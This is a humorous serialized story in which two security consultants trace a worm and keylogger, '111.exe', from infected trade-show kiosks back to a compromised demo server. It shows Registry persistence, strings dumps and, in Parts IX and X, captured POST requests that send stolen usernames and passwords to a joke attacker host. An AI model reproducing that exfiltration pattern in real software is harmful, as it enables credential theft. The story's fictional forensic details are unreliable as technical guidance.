Scrap stared at the LCD screen. His left hand extended up to the top of his head to scratch the crown of his skull with one fluid, chimp-like motion.

"I was looking at the registry of this box, and look what I found here!" Scrap said as he pointed to the active registry editor window.Scrap was pointing to a specific registry entry.

HKLM\Software\Microsoft\Windows\CurrentVersion\Run

Inside this entry was a run path to an executable file:

111.exe

"Well, that's kind of obvious." I remarked. "Have you found other entries?"

Scrap raised his eyebrows as he glanced towards me.

"Oh, but that's not the interesting piece here. There are two '111.exe' processes running!"

I looked at the task manager that Scrap had running in the background. Sure enough, there were two entries. One was consuming all available CPU cycles.

The other looked dormant.

"Hey Scrap, pkill that CPU-hog process." I suggested.

Scrap selected the process and killed it.

"Uh, ok. Now what?" Scrap asked.

"Let's wait a minute." I replied. I had a hunch.

Before either of us could think about sending the other for coffee, a new 111.exe process appeared and started consuming CPU cycles again.

"What the ... hey, how'd you know that was going to happen?" Scrap asked with another scratch of his head.

"The second process is apparently some kind of 'watcher'. It makes sure that the 111.exe process is always running. We missed this earlier." I said. "We need to establish how this software was installed and figure out what it's doing with all those cycles."

"Got it." Scrap responded. "How about we plug this baby into a small hub and start sniffing?"

Instinct was starting to kick in with Scrap. This is always something good to see with someone who views you as a mentor.

"Do it. I'm going to knock on the front door of this box with a vulnerability scanner. I'd like to know where the holes in the dike are."

Scrap grabbed a four port hub from the laptop carrier. The suspect kiosk box was plugged into one port, and his laptop into another.

"Ethereal?" I asked as I saw Scrap type away on the scraptop.

"But of course." Scrap said with a grin.

I grabbed my powerbook and reconfigured the ethernet interface for the private network that Stevie had been using for the kiosks. I fired up an X11 session and an xterm.

"Nessus?" Scrap asked in the same voice I used when asking about ethereal.

"Duh." I jokingly replied.


chimptop:~ chief$ sudo su -
Password: **********
chimptop:~ root# nessusd &
[1] 5147
chimptop:~ root# exit
logout
chimptop:~ chief$ nessus &


Within a few seconds, the nessus setup window appeared. After logging in to nessus, I selected the kiosk box as my target.

"Hold off on ethereal while I scan this baby." I asked Scrap. "Fire in the hole!"

With a click of the "start the scan" button, nessus sprang to life and initiated a port scan.

At this point, Scrap and I decided to wander over to the coffee bar that we passed on our way into the show.

After ordering two large coffees, we sat at the only empty table available.

"Hey Scrap!" said an unknown individual as they walked toward our table. "Mind if I pull up a chair?"

Scrap lit up like the Zippo lighter that he kept in his pocket.

"Chief, this is Dan. This is the guy we're stealing, um, borrowing power from."

"Hi Dan. Pull up a chair." I said as I shook Dan's hand.

"Thanks for the tickets man. They'll be put to good use, I assure you!" Dan said as he high-fived Scrap across the table.

As Scrap and Dan talked, I couldn't help but notice the logo on Dan's shirt.

TinFoil Software Solutions.

"I'll leave you two to swap stripper stories. I'm going to head back to the booth."

I sauntered back to the rear of the booth and cleared the screensaver on my powerbook. Nessus had finished it's scan of the machine.

"What the hell?" I said as I glanced over the nessus report.

The kiosk machine answered to ping requests, but no other information was available.

Apparently the front door on this machine was locked.

Part IV

"Later dude!" I heard Scrap yell as he entered the booth. Scrap downed the last of his coffee and tossed the cup into the garbage can ten feet away.

"Hey Chief, are you starting my ethereal sniff without me?"I had hunkered down onto the floor next to the table with the Scraptop on my lap.

"What was your first clue? Nessus returned a big goose egg on the vulnerability scan. It's time to see what our magical 111.exe process is up to." I replied as I initiated the ethereal session.

After a brief pause, the network traffic started scrolling down the ethereal GUI. I had disabled the auto-scroll function so that I could manually look through the traffic. Scrap took this opportunity to sit down next to me and glance at the activity.

"Woah! That's a chatty box." Scrap exclaimed as he moved in for a closer look.

"What the hell kind of traffic is that anyway?"

"It would appear to be ICMP packets." I replied as I clicked on the conversation in question. "Look at that! It's pinging addresses in the locally assigned subnet, and expanding the address space of the ping randomly. Wait, it's not random. Now look at the pattern!"

Scrap grabbed the Scraptop from my hands and scrolled through the traffic.

"Dude, it's looking for hosts. And since it's the only active IP on the hub, it's not finding much!" Scrap said with a laugh.

"So, it would appear that it's exhibiting some kind of weird worm behavior. That could possibly explain how it got on both machines?" I pondered out loud.

We captured about fifteen minutes of traffic before Scrap killed the ethereal session. The log file was saved to disk.

"That was fun. Now what, man?" Scrap asked as he closed the lid to the scraptop.

"We still haven't established how it got onto the machines in the first place. It could have been on the machines when they were set up. It could be on the image CD that Stevie has. It could have wandered in while Stevie was making firewall changes. We have a lot of questions, but no answers." I said. "But I bet Stevie can help us in this endeavor."

I sent Scrap off to find Stevie and to grab me another cup of coffee.

"Wow, there's a lot of people at this show." Reese said as she popped into the back of the booth. "Find anything yet?"

"Nothing conclusive. How are the laptops doing?" I asked.

"Wonderful! Just wonderful. No problems. I really appreciate you guys bailing me out like that. Dinner is, of course, on me tonight." Reese said with a smile.

No sane investigator argues with a free dinner.

"Ladies and gentleman ... Stevie Wonder!" Scrap joked as wandered back with Stevie in tow.

"Like I don't hear that every day." Stevie lamented. "Scrap says you need my help?"

I stood up and walked towards the storage room in the booth where the networking equipment was installed.

"Stevie, can you do a dump of your firewall logs? Everything you have since you set up the equipment here in the booth?" I asked with a grimace. I was hoping that a possibly clueless Stevie was maintaining some firewall logging.

"Uh, sure. I think. Maybe Scrap should help me." Stevie suggested as he entered the small storage room.

"This ought to be good." Scrap whispered as he eyeballed the firewall setup.

"Hey, it's a linux appliance! Our luck may not be so bad today." Scrap said with a grin as he looked through the log files. "Hello Dolly, there be logs here!"

Well what do you know? Maybe our luck was getting better today.

"Is secure copy installed? Let's copy them off to your laptop and have a look." I bellowed in a semi-authoritative tone. I loved looking through logs.

Several minutes and a hacked-together ssh configuration later, the logs were at rest on the scraptop.

I loaded the first file into the 'vi' editor and did a cursory examination of the logs from the moment that the firewall was booted at the show.

"What time where the kiosks turned on?" I asked Stevie.

"Um, about seven this morning. Yep, it was seven. That's when I got here."

A quick examination showed that Stevie was correct. Broadcast traffic from the Windows kiosks was denied at the firewall shortly after seven.

I'm the first person to complain about noisy Windows boxes, but in this particular case, that broadcast traffic was going to be a useful time gauge.

"If my theory is correct, the broadcast traffic should stop at a certain point, and then we should see a storm of ICMP traffic." I said. "Cross your fingers."

I scrolled further down into the logs, and sure enough the broadcast traffic stopped abruptly shortly before eight o'clock in the morning ... almost an hour after the boxes were turned on.

"Eight o'clock. Eight o'clock. What the hell happened at eight o'clock?" I asked out loud.

"Eight o'clock? That's when I did my first demo." Reese replied.

Interesting.

Part V

*tap* *tap* *tap*

I was scrolling down through the log file at an ever-increasing rate of speed. The log file entries seemed to indicate that the first kiosk box started it's ping sweeps at eight o'clock. (log file entries shortened for easy reading)

080000:ICMP:REJECT:192.168.1.100
080001:ICMP:REJECT:192.168.1.100
080002:ICMP:REJECT:192.168.1.100
080003:ICMP:REJECT:192.168.1.100


"I wonder when our second kiosk box gets in on the action?" I pondered to myself. I kept tapping on the keyboard until I saw the second kiosk's IP address appear.

"What the heck? This makes no sense." I whined.


082700:ICMP:REJECT:192.168.1.101
082701:ICMP:REJECT:192.168.1.100
082702:ICMP:REJECT:192.168.1.101
082703:ICMP:REJECT:192.168.1.100


"Now wait one dollar-waving second." Scrap spoke up as if he were reading my mind. "Twenty-seven minutes past the hour the second magically joins the ICMP chant? There's no way it would take twenty-seven minutes for an exploitable box like that kiosk to fall down on it's face. This really doesn't make any sense."

"For once Scrap, I agree with every single thing you just said. There aren't a lot of clues here, not much more to go on. We're going to need to set up a lab environment somewhere and test this." I replied. "Where's Stevie?"

Stevie was no where to be found.

"Probably draining the lizard or something. Hey, here's that machine image CD he was carrying around." Scrap said as he tossed the CD to me. "Why do I have a feeling we're going to be dragging gear up to the room to test this theory of yours?"

"Once again grasshopper, you have read my mind." I joked. "Let's secure this stuff and head back to the room and do some testing."

An hour later, Scrap and I were back in our hotel room. All of the typical hotel amenities were scraped off of the small desk, and in their place were two LCD monitors attached to two computers sitting on the floor.

"Time for exploratory PC surgery." I said as I handed Scrap an IDE drive sealed in an anti-static bag.

"Uh, aren't these from our forensic kit?" Scrap said as he scratched his chimp-like head.

"Hey, they are all we have right now. Let's swap the IDE drives out and get some installation action going." I replied while prying the case off of the first PC.

Minutes later we had two computers with two new hard drives installed. The machines were plugged into an ethernet hub.

Scrap popped Stevie's CD into the first machine, closed the tray, and hit the power button on the computer. The fans sped to life and we received a prompt on the screen about booting off of the CD.

"Yes, please!" Scrap said as he tapped the space bar.

At first the installation looked like a standard Windows 2000 Workstation installation. However, it would appear that Stevie had crafted a clever installation script of some type that configured everything on the workstation except for the networking information. After two more reboots, we were in business.

"Got the Scraptop attached and ready to go?" I asked Scrap as the machines prepared to boot into the operating system.

"Roger that, man." Scrap replied as he peered down onto another session of ethereal.

"Here they come!" I said with a laugh. Both machines completed their boots into the operating system.

One hour later, Scrap and I were staring at the bottoms of our coffee cups and bored to tears. There was no activity in ethereal aside from the normal Windows broadcast traffic.

*yawn*

I decided to do some poking and prodding. I fired up nessus on my powerbook again and scanned both workstations with the latest tests installed.

The results surprised us both.

"Am I reading that right? We have the usual Windows management ports open, and that's it? And none of the exploit scripts worked?" Scrap asked with amazement.

"That's what I'm seeing. I wonder if Stevie actually patched these things somehow, or maybe he has a stealthy host-based firewall running on here." I replied as I started clicking around on one of the kiosks desktop.

I paused, and stared at my cursor. It couldn't be this easy, could it?

"Dude, you have that weird freaked-out look on your face again. Did lunch not agree with your innards again?" Scrap asked compassionately.

I turned to look at Scrap and started to chuckle.

"Scrap, we're looking at this all wrong." I said with another laugh.

"Like, uh?" Scrap asked.

"Like ... we're looking at the wrong end of the toothpaste tube." I replied.

Part VI

"Dude! I smell prime rib!" Scrap exclaimed as he stepped out of the elevator and into the lobby of a posh steak restaurant.

"It would appear that we're early. No sign of Reese. Let's hit the bar." I said as I whisked Scrap off to an empty bar table, complete with stools."Like, HI! What can I get you two gentlemen?" the waitress asked.

Scrap was screaming through the drink menu at a break-neck speed. "I'll have a large mug of your finest house ale!"

"Um, like we have ten house ales. Which one?" the waitress asked impatiently.

"The one that costs the most. He's paying." Scrap replied as he pointed in my direction.

"I'll have the same." I said as I threw the drink menu at Scrap.

Scrap lit up a fresh cigarette and and grabbed my arm.

"Chief, that waitress that was just here ... was that ...?"

"No Scrap, that wasn't Barbie." I said with a chuckle. Scrap never forgets a face, or something like that.

"Hi guys. I am so sorry I'm late!" said Reese as she pulled up a bar stool. "The restaurant is really busy, so even with our reservations we're looking at another ten minutes or so. So what have you boys been up to today?"

I pulled out my PDA and scrolled through some notes.

"Reese, what do you know about Stevie?"

Reese was startled by my question, but quickly collected her thoughts.

"Stevie has been with us for a few years. He does a great job, but only does exactly what is listed in his job description. Thinking outside of the box is not his strong point." Reese said. "Was he any help in tracking down all of that stuff with our kiosks?"

Scrap chuckled. "Uh, well sort of. I had to do the firewall log collection myself since he wasn't aware of how to do it."

Reese tapped her cell phone on the table. "Yeah, I know. He's not perfect, but he does exactly what I ask. He's very polite to everyone too, which is a stark contrast to our previous technical services person. Chief, did you meet Weed when you were on site doing our security evaluations?"

I was halfway through remembering back that far in time when the waitress appeared with our beers. Reese ordered something fruity with an umbrella and returned her attention to me.

"I do. Weed was the typical BOFH (Bastard Operator From Hell). He was very resistant to making critical security changes in the operations center. He fought me on nearly every change, right down to registry settings on Windows servers." I said in between sips of beer.

I reviewed the notes on my PDA one more time before asking Reese another question.

"Reese, your new product is entirely web-based and appears to be an application service provider model where the client connects to your servers and works remotely. Correct?"

Reese took her fruity drink from the waitress and had a quick taste.

"Yes. We're an ASP model. Why?"

"Well," I began, "how many people connect to the demo server that you were using today?"

"Only the sales and product management staff. Well, okay that's not completely true. Road show demos like the one I'm doing now use a completely separate server in our datacenter. I remember the operations manager saying something at a meeting that we were going to dedicate bandwidth and server resources to the road show systems so we didn't have to worry about slow demonstrations." Reese replied.

"I see. And how many other people are doing road shows right now?" I inquired with a few more sips of beer.

"You're looking at her. We're hiring a person to do this job right now. I'm just filling in." Reese mumbled after flicking the umbrella out of her drink and into Scrap's hair. That was impressive.

"I have to tell you, Reese, that we still have a lot of theories right now. Scrap and I would like to bring the kiosk boxes back into the booth tomorrow and run another test. Would you mind?" I asked with a smile.

"With all of this work, I imagine you're going to want to be compensated." Reese said with a quick glance around the table. "I'll see what I can do on that. I appreciate you helping me out on this. Bring the kiosks by about seven o'clock. I should be there around that time."

"Way Cool!" Scrap yelled. "Looks like our table is ready."

After a meal fit for kings, Scrap and I returned to the hotel for a much needed night of rest.

***

Early the next morning we made our way down to the show floor, kiosk machines and LCD screens in our arms. I spotted Reese at the coffee bar.

"Hook the gear up, I'm going to brief Reese." I said as I wandered off.

Reese needed some immediate assistance with the steaming cups of coffee goodness in her hands.

"Thank goodness you guys showed up. I was worried that these were going to get cold." Reese joked as she handed me two of the cups. "So what do you need me to do to help with this test that you talked about last night? Just log into the application?"

"Pretty much." I replied. "Scrap should have the gear hooked up and ready to go."

Minutes later we were all huddled around the first kiosk machine, our recent IDE drive installation still in it's belly.

"Scrap, are we ready?" I asked with a wink.

"Fire in the hole!" Scrap replied.

Reese carefully logged into the web application. She was greeted with the same menu that we had seen the day before. Everything appeared to be normal.

"Proceed as if you were giving us a demo." I said as I watched Reese move through the screens.

"Chief! We have a visitor!" Scrap yelled as he turned the Scraptop around so that I could view his ethereal session.

Part VII

"What? Who? Visitor?" Reese asked in a worried voice. "I don't understand. Someone is on my demo kiosk?"

I stared at the ethereal message that Scrap was pointing to on the scraptop. It would appear that after logging in to the web application, the web browser had downloaded an executable piece of code:


111.exe. "Are we still recording?" I asked as I turned my attention back to the internet explorer window on the kiosk machine.

"Roger that." Scrap said as he continued to eyeball the traffic in the ethereal window.

"What are you seeing?" I queried as I brought up the task manager on the kiosk machine.

"Nothing now." Scrap responded.

I saw a single 111.exe application running, and then I had two!

"How about now?" I asked excitedly.

"Gah! ICMP traffic like a mother!" Scrap exclaimed as he click around on the scraptop. "She's pinging like a drunk sub captain!"

"Are you ready for phase two?" I asked Scrap.

"One second!" Scrap muttered as he reached around and plugged the ethernet cable into the second kiosk machine. "Here goes nothing!"

I sidestepped over to the second kiosk machine and brought up task manager.

I waited one minute, then two minutes, then three minutes without any activity.

"What the hell?" I pondered as I continued to stare a hole into the screen of the second kiosk.

One half-hour later, we unplugged both kiosk machines and feasted on cold coffee.

"Chief, what just happened?" Scrap asked as he ran his chimp-like paw through his tattered hair.

A half-smile appeared on my lips. "Well, I'm pretty certain that the 111.exe process is more of an annoyance than a threat at this point. It wasn't able to exploit anything on the second kiosk machine, even though we have positive evidence in the ethereal logs that it attempted to."

"Tell me something I don't know. What does it all mean, man?" Scrap said in a flippant manner.

"It means, clubhopper, that my theory about the toothpaste tube was correct. We have a server that is potentially compromised and distributing this 111.exe application through an unidentified internet explorer exploit of some type. The payload of the 111.exe appears to be somewhat benign to the Windows 2000 image that was used to build these machines." I replied as I emptied the last part of my cold coffee surprise into my mouth.

"Chief, excuse my lack of technical skill here, but what did you just say?" Reese asked with a few blinks of her eyes.

"What I'm saying," I began, "is that the demonstration server that you're logging into at your HQ is sending your web browser an instruction to download and execute a special program that you don't want to download or run. We now need to focus our attention on that server and answer the basic questions."

"Basic questions?" Reese asked with an additional puzzled look on her face.

Scrap snapped to attention. "Oh! Oh! Mr. Kotter! Mr. Kotter! I know these. How did the payload get on the server? How did it go undetected this long? Um, what safeguards were effective and ineffective in preventing this, who has access to the server ..."

"Very good Scrap. We don't need to bore Reese with the whole list. Reese, we need to talk to someone at HQ and get this server looked at. Today is the last day of the show, and this could mean no demonstrations if we can't get this fixed quickly." I told Reese sympathetically.

"Crap." Reese replied as she stared at the ceiling.

"Or, you continue to use our laptops to do your demos today, we take the risk for business reasons, and we work with HQ tonight or tomorrow." I snapped back, trying to prevent Reese from tearing up.

"I like that option." Reese said as she perked up. "Let's go with that. I'm going to write down the CTO's name and number on the back of my business card. He's new since you were at HQ. Call him and let him know what's up. I'll send him a text message alerting him of your impending call."

"Works for me." I replied as I helped Scrap disconnect the kiosk machines and set the demo laptops in their place.

A few moments later, the demo laptops were back in action. Scrap and I took a few moments in the back of the booth to collect our thoughts.

"Dude, she was looking at us like a cow with a bastard calf when you wanted her to pull the demonstrations today." Scrap said with a laugh. "You're getting crank in your old age."

"Where the hell do you get those sayings? Cow with a bastard calf?" I replied as I rolled eyes. "Remember, we always have to give the client the options with the risks. They get to make the decision, because they are the ones signing the checks. It has nothing to do with me being a few years older than your punk butt."

"Whatever dude. What's the plan?" Scrap asked.

"We call Mister ... Mister ... give me the card, Scrap!" I demanded. Scrap was using the card that Reese had given us as a chew toy of sorts.

"Mr. Griffin. Peter Griffin!" I said out loud as I grabbed my cell phone.

The conversation with Peter went from curious to confused in a matter of minutes. Peter insisted on putting his new systems administrator Brian Dogson on the phone.

I rattled off the events of the past few days to Brian who appeared to be technically proficient enough to ask intelligent questions after each of my statements.

"So, the plan would be to take the server offline tonight after the demonstrations are over." I said to Brian. "Do you have someone available to do that?"

"Not a problem. I'll stay late and take it offline myself. I have a question for you, though. You said that server forced a download of an executable file to the browsers?" Brian asked.

"Yes. It executed immediately and spawned another copy of itself as a watcher process." I replied.

"Process? What was the name of this process?" Brian asked.

"111.exe. Why?" I asked.

"Please tell me you're kidding around." Brian begged.

Part VIII

An uncomfortable laugh filled the phone line. I could hear Brian moving the phone away from his mouth to lessen the impact of his disbelief.

"You've seen this 111.exe process before?" I asked.
"Chief, I've spent the past year trying to clean that thing off of various machines here at HQ. Nobody seems to know where it came from, how it gets onto our machines, or how to keep it off."

I paused for a moment. I had a strange gut feeling where this was going.

"I thought I had completely eliminated that thing." Brian explained. "And now to hear that it's on the demo server just makes my frick'in day! I'm going to need a few martinis after work now."

I chuckled. "You and Scrap will get along marvelously. I have to ask you how you've been cleaning this thing off of infected machines."

Brian cleared his throat. "Well, it's been trial by error, actually. We started having complaints from laptop users in the field. Our tech did a pretty thorough analysis of the laptops and found the 111.exe process. They treated it like any potentially dangerous piece of malware. They slaved the drives, copied off important files, wiped the machines and put our OS image back on the machines. This worked out great. We had deeper problems with servers, as you can imagine."

"I bet." I replied. "Most of your servers probably contained drive arrays. That's a little more complicated."

"We're on the same page there. The only good news I can find here is that we haven't had any other reports of servers exhibiting the strange behavior, so maybe after we set up a fresh demo server we'll be good to go." Brian said with a sigh.

"Let's hope so." I said as I ended the phone conversation.

My gut was rumbling, and it wasn't from the bagel that I ate for breakfast.

"Scrap! Grab one of the kiosks, your laptop, and join me in the back of the booth." I yelled over to Scrap in an attempt to distract him from the neighboring booth babes.

"On it." Scrap replied as he waved goodbye to a statuesque brunette. "This job is killing my social life."

"Whhhhiiirrrr!"

The fans of the kiosk machine spun up and the LCD screen lit up with a Windows 2000 boot screen.

"What gives, boss?" Scrap inquired as he made himself comfortable on the floor beside the kiosk machine.

"Scrap, what exactly does this 111.exe process really do?" I asked as I brought up task manager on the kiosk machine. The 111.exe processes were running full steam ahead and consuming massive amounts of CPU resources.

"It's a naughty replicating worm, right?" Scrap responded.

"Yes, but what makes it tick? It's time to dig deeper. Hand me our Windows utilities CD." I said as I opened the CD tray on the kiosk machine.

I inserted a CD containing several commonly used file examination utilities, and opened a command prompt.

D:\tools\winx86\binutils\strings c:\windows\111.exe

banc
bank
banco
dinero
money
username
PIN
password
funds
trade

"What the clueless cover charge is that?" Scrap said with a loud gulp from his warm soda bottle.

Part IX

"Chief, you really need to go back to your caffeinated ways man. How exactly does a list of words give somebody a motive to create and distribute this little worm?" Scrap said as he bit his lower lip. Not only was Scrap a top-notch systems administrator, but a first-rate Pamela Anderson impersonator - without the surgeries.I grabbed an ethernet cable and snaked it into one of our micro-hubs.

"Plug the Scraptop in, and get an ethereal session running." I barked at Scrap as I initiated an Internet Explorer window.

"Done." Scrap replied back after a few taps on his keyboard.

"Don't take your eyes off of that ethereal window." I said as proceeded to type a URL into the address bar of Internet Explorer.

http://www.bankofamerika.com

Without any DNS services available, my request was immediately met with a "could not resolve hostname" message.

"Anything?" I asked Scrap.

"Nothing unusual. A metric ton of ICMP garbage from the 111.exe process and the normal windows chatter." Scrap shot back, his eyes carefully fixed on the ethereal window.

"Ok, keep watching." I said as I typed more URLs into Internet Explorer.

http://www.bancoespana.com

http://www.moneyandmatters.com

http://etraderr.com


Nothing.

"Let's make this interesting." I said as I ran an ethernet cable from our hub to the network switch that was outside of Stevie's firewall.

I gave the kiosk machine a real IP address, and moved on to another URL.

http://omgtehmarketfunds.com

"Chief, I have nothing. You really have lost your little monkey mind this time." Scrap joked, still not taking his eyes off of the screen.

Instinct took over as I stared at the "Username/Password" fields on the omgtehmarketfunds.com website. I typed in what I hoped was a bogus username and password and pressed the "login" button.

"Woah! Woah! Wait... wait. I need to scroll back." Scrap said in a slightly higher voice than usual. I hadn't heard Scrap talk that way since he switched from boxers to briefs eons ago.

"What do you have? What?" I asked as I leaned over to catch a glimpse of the ethereal window.

"Holy two-for-one table dances. That whipped by so fast I barely saw it!" Scrap exclaimed.

"Kind of like high school?" I joked.

Back to being serious.

"I'm going to slap you upside the head if you don't move so I can see." I said as I pulled the Scraptop closer to me.

POST http://allyourbase.belongto.us/x.php?a=omgmarketfunds.com&b;=lickamonkey&c;=bigbigpaws


I had a smile on my face that nearly engulfed my entire face. Once again, instinct was right on the money.

"Don't get cocky, monkeyboy. Keep testing." I said under my breath as I type in more URLs.

http://www.bancone1.com/

I glanced at the Scraptop.

POST http://allyourbase.belongsto.us/x.php?a=bancone1.com&b;=myhovercraft&c;=fullofeels

"Intelligent freaking keylogger." I said to myself.

"Yo, is that doing what I think it's doing?" Scrap quizzed.

Scrap is one sharp chimp sometimes.

Part X

"Are you absolutely sure?" I asked Reese as she sat down with us in the back of the booth for a quick coffee break.

"Yes, I'm sure. We never do anything on those kiosk machines but visit the demo site." Reese replied. "But you should probably check with Stevie as well."

"I'll go find him." Scrap said as he took off towards the network cabinet of the booth.

"You have to understand that our discovery this morning changes the face of this whole thing. Brian Dogson told me that this thing was all over your HQ network and they finally stamped it out. The risk here is that we have no idea how much data has been compromised on your network, and by whom." I informed Reese after a quick swig of coffee. "I need to call Brian back and tell him about our findings. I have an idea about how we might ..."

"Stevie says he never went to other sites on the kiosk machines, he always used his laptop." Scrap interjected as he sat back down.

"I need to get back to the floor, please call Brian as soon as possible." requested Reese as she stood up and placed her coffee cup in the trash can.

"This whole thing is freaking me out."

I picked up my cell phone and dialed Brian's direct line.

"Dogson." Brian said into his cell phone.

"Brian, it's Chief. We have a ..."

"Is it time to down the demo servers yet? I really want to have a social life tonight." Brian interrupted.

"Brian, listen. The 111.exe process is an intelligent keylogger. It is somehow grabbing URLs, usernames and passwords from financial sites. You have to assume that any web sites that your staff have visited since your discovery of the 111.exe process have been compromised." I said in a rushed voice.

"Oh my God. Oh my God." Brian whimpered. "I'm never going to get out of here this weekend!"

"Brian, calm down. Look, I think I have a way to narrow down which machines you need to check first - these would be the primary suspect machines. Go through your http proxy logs and look for any traffic to http://allyourbase.belongto.us. A quick grep for that URL should give you a list of proxy usernames and IP addresses. Check those machines. If you're running DHCP this is going to get a bit more complicated." I said in a reassuring voice.

"Uh, right. Well, to be honest we're not using DHCP. Everyone has a static ip address. I'll get on this right away. What should I do after I have verified that the process is not on any machine?" Brian asked.

"Update, patch and scan the hell out of those boxes. Make sure they are as clean of any malware as possible. Then, you need to make the users of those machines aware that their access to those sites may have been compromised, and they should change their credentials as soon as possible. They may want to file some fraud alerts with their institutions." I replied.

"Oh boy, okay. Let me get on this and I'll call you back." Brian said as he quickly hung up on me.

Scrap had been listening to my phone call with very perked ears.

"So now what do we do, Brain?" Scrap joked.

"What we do every day, Pinky. We go look for coffee."

Part XI

The great thing about Starbucks locations (besides the wonderful coffee) is that they are everywhere. Scrap and I had decided to head back to our hotel room, and stopped at a "holy green-logo'd shrine to the coffee bean" on the way."So what do you think, Chief? What's the deal with this intelligent keylogger, the obvious CPU abuse, the magic appearance on the demo server, and the lack of good coffee at that show?" Scrap asked with a smile.

I took a large gulp of a perfectly tempered kona blend.

"I'm wondering how we keep getting ourselves into situations like this." I joked.
"Seriously, the whole thing reeks worse than your laundry basket. I think once ..."

*RING*

I glanced at my phone. It was Brian.

"Chief." I said into my magical silver talking box.

"Dude, I so want to go home. I looked through all my logs and it looks like any potential damage was minimized after we went through and nuked this thing from our network a while ago. The demo server situation bothers me though. I still can't figure out how it got on there or why we didn't detect it earlier. Do we have a 'go' on the disconnect?" Brian asked.

I glanced at my watch. Two hours to go.

"We need to give Reese at least another two hours. I'd set up some monitoring equipment on that segment and keep an eye on things for now. Scrap and I are going to our hotel room to brainstorm and rest. I'll call you in two hours." I replied.

"Okay. This whole thing stinks man!" Brian whined as he hung up.

That was the understatement of the day.

Scrap and I finished our journey back to our hotel. I took up refuge at the desk with my Apple Powerbook, while Scrap crashed out on the bed. They just don't make apprentices like they used to.

"Why, why, why?" I pondered as I wrote up some notes on the events of the past few days. "Why would anyone invest so much time and energy into capturing financial login details with such a poorly written and designed application? Did they not test the application? Were they not familiar with ..."
BAM. The caffeine from my Starbucks-induced coffee binge started to ignite neurons in my monkey brain. The cloudiness subsided, and I could almost visualize the author of 111.exe in front of their computer ... working on the code ...

I flipped virtual desktops on my Powerbook and opened a console prompt.

$ cd captures/current

$ strings 111.exe

I searched through the text on my screen and wanted to flog myself for completely ignoring valuable information that was right in front of me. I had performed so many string dumps on naughty executables that my eyes had a bad habit of skipping extraneous text.

l33t tr0j@n by f1ngerb3nd3r

I knew that name, and f1ngerb3nd3r didn't write keyloggers.

The author of 111.exe had embedded a keylogger in a common trojan package in a very poor fashion.
